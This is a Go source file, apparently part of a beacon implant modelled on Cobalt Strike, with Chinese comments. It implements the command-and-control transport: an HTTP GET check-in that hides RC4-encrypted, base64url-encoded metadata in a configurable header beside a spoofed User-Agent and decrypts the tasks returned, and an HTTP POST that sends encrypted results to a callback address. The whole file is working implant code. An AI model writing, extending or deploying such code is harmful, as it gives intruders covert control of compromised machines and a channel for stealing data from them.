package common

import (
	"Beacon/profile"
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
)

func HttpGet(metaData []byte, sessionKey []byte) ([]byte, error) {

	url := profile.BeaconProfile.CallbackAddresses[0] + "/" + profile.BeaconProfile.URI

	// ====== RC4加密 ======
	rc4_key := profile.BeaconProfile.EncryptKey
	encryptedMetaData, err := RC4Crypt(metaData, rc4_key)
	if err != nil {
		return nil, err
	}
	// ====== base64url 编码 ======
	metaDataB64 := base64.RawURLEncoding.EncodeToString(encryptedMetaData)

	// ====== 设置到请求头 ======
	cookieValue := profile.BeaconProfile.HBPrefix + metaDataB64

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Request error:", err)
		return nil, err
	}
	req.Header.Set(profile.BeaconProfile.HBHeader, cookieValue)
	req.Header.Set("User-Agent", profile.BeaconProfile.UserAgent)

	// ====== 发送HTTP GET请求 ======
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("HTTP error:", err)
		return nil, err
	}
	defer resp.Body.Close()
	respBytes, _ := io.ReadAll(resp.Body)

	if resp.StatusCode != 200 {
		fmt.Println("Status:", resp.StatusCode)
		fmt.Println("Decrypted Response:", string(respBytes))
		return nil, errors.New("http response error:")
	}

	// 用 SessionKey RC4 解密
	decrypted, err := RC4Crypt(respBytes, sessionKey)
	if err != nil {
		log.Fatalf("rc4 decrypt error:%v", err)
	}

	fmt.Println("Status:", resp.StatusCode)
	fmt.Println("Decrypted Response:", string(decrypted))
	return decrypted, nil
}

func HttpPost(metaData []byte, body []byte, sessionKey []byte) {
	url := profile.BeaconProfile.CallbackAddresses[0] + "/" + profile.BeaconProfile.URI
	rc4Key := profile.BeaconProfile.EncryptKey

	// 1. 加密 metaData
	encryptedMetaData, err := RC4Crypt(metaData, rc4Key)
	if err != nil || encryptedMetaData == nil {
		fmt.Printf("rc4 encrypt metaData error: %v\n", err)
		return
	}
	metaDataB64 := base64.RawURLEncoding.EncodeToString(encryptedMetaData)
	cookieValue := profile.BeaconProfile.HBPrefix + metaDataB64

	// 2. 加密 body
	encryptedBody, err := RC4Crypt(body, sessionKey)
	if err != nil || encryptedBody == nil {
		fmt.Printf("rc4 encrypt body error: %v\n", err)
		return
	}

	// 3. 构造请求
	req, err := http.NewRequest("POST", url, bytes.NewReader(encryptedBody))
	if err != nil {
		fmt.Printf("request error: %v\n", err)
		return
	}
	req.Header.Set(profile.BeaconProfile.HBHeader, cookieValue)
	req.Header.Set("User-Agent", profile.BeaconProfile.UserAgent)

	// 4. 发送
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("http do error: %v\n", err)
		return
	}
	// 只有 resp != nil 才需要关闭
	defer resp.Body.Close()

	// 5. 读取响应
	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("read response error: %v\n", err)
		return
	}

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Status: %d\nDecrypted Response: %s\n",
			resp.StatusCode, string(respBytes))
	}
}
